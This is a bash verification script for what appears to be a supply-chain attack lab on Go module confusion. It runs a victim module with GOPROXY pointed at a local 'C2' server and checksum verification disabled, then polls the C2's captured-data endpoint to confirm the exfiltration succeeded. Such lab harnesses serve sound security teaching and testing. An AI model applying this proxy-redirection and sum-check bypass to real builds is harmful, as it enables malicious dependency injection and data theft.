#!/usr/bin/env bash
# Auto-generated verify for 28-go-module-confusion
set -euo pipefail

ROOT="$(cd "$(dirname "$0")" && pwd)"
COMPOSE_FILE="${COMPOSE_FILE:-$ROOT/docker-compose.yml}"
C2_URL="${C2_URL:-http://127.0.0.1:3028}"

if [[ ! -f "$COMPOSE_FILE" ]]; then
  echo "Error: compose file not found: $COMPOSE_FILE" >&2
  exit 1
fi

echo "===> Clearing prior captures"
curl -sf -X DELETE "http://127.0.0.1:3028/captured-data" >/dev/null || true

echo "===> Triggering lab (GOPROXY=http://127.0.0.1:3028,off GOSUMDB=off GONOSUMDB=* go run -mod=mod .)"
docker compose -f "$COMPOSE_FILE" exec -T victim \
  bash -lc 'cd /lab/28-go-module-confusion/victim-module && GOPROXY=http://127.0.0.1:3028,off GOSUMDB=off GONOSUMDB=* go run -mod=mod .' || true

echo "===> Waiting for capture (grep: example.com/corp/widget)"
ok=0
for _ in $(seq 1 30); do
  DATA="$(curl -sf "$C2_URL/captured-data" 2>/dev/null || echo '{}')"
  if echo "$DATA" | grep -q 'example.com/corp/widget'; then
    ok=1
    break
  fi
  sleep 1
done

if [[ "$ok" -ne 1 ]]; then
  echo "Verification failed for 28-go-module-confusion" >&2
  echo "$DATA" || true
  exit 1
fi

echo "Verification successful: 28-go-module-confusion"
exit 0
